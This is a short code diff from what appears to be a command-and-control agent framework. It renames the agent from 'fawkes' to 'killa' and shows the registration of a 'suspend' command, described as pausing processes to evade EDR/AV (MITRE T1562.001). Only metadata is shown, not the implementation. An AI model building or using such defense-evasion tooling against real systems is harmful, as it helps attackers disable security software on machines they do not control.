@@ -7,7 +7,7 @@ import (
 )
 
 func init() {
-	agentstructs.AllPayloadData.Get("fawkes").AddCommand(agentstructs.Command{
+	agentstructs.AllPayloadData.Get("killa").AddCommand(agentstructs.Command{
 		Name:                "suspend",
 		Description:         "Suspend or resume a process by PID — tactical pause for EDR/AV (T1562.001)",
 		HelpString:          "suspend -action <suspend|resume> -pid <PID>",
